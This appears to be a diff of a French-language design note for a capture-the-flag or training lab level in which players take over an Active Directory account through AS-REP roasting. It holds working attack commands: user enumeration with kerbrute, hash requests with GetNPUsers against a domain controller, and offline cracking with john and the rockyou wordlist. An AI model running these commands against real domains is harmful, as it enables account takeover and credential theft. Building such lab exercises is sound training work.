@@ -188,15 +188,15 @@ Level 2 prendre controle d'un compte sans permission (ASREP-Roasting) :
 Procédure pour trouver le hash (à réaliser) :
 Avoir une liste de user pour réaliser un bruteforce sur les username. Pour cela, on peut fournir une liste d'user à l'utilisateur qui peut telechagrer depuis le site web avec 1000 username afin de bruteforce et on met par exemple 5 username valides.
 
-userenum --dc $IPDC$ -d $NOMDOMAINE$ userslist.txt -t200
+kerbrute userenum --dc $IPDC$ -d $NOMDOMAINE$ users.txt
 
 Mettre dans list_recup.txt les noms recuperes
 
 Ensuite 
 
-impacket-GetNPUsers -request -outputfile hashes.txt -format john -userfile list_recup.txt -dc-ip $IPDC$ $NOMDOMAINE$/
+GetNPUsers -request -outputfile "hashes.txt" -format "john" -userfile "list_recup.tx"t -dc-ip 10.100.0.111 "ballagio.com/"
 
-Connexion en WinRM ou autre avec le compte de service.
+john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
